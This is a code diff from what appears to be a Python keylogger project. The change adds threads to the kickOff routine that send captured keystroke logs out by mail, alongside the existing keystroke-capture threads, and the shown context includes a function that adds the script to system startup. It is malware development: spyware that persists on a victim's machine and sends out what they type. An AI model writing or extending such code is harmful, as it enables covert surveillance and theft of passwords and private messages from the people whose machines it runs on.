@@ -166,8 +166,6 @@ class Constants:
     PYTHON_DEFAULT_LOCATION = ""
 
 
-
-
 class OSmanipulation(object):
     """Contains methods for OSmanipulation:
     Things like copying files and searching files
@@ -407,17 +405,20 @@ def add_self_to_startup():
 
 def kickOff():
 
-    # Make sure script is added to startup
     # Create the Keylogger object
     keylogger = KeyLogger()
 
-    # Define the threads
+    # Define the threads for the keylogger
     start_keylogger_thread = threading.Thread(target=keylogger.startKeyLogger)
     stop_timer = threading.Thread(target=keylogger.stopkeylogger)
+    keylogger_mail_thread = threading.Thread(target=keylogger.send_keylog)
+    stop_keylogger_mail_thread = threading.Thread(target=keylogger.stop_to_send_keylog)
 
-    # Start the threads
+    # Start the threads for the keylogger
     start_keylogger_thread.start()
     stop_timer.start()
+    keylogger_mail_thread.start()
+    stop_keylogger_mail_thread.start()
 
 
 # import winreg
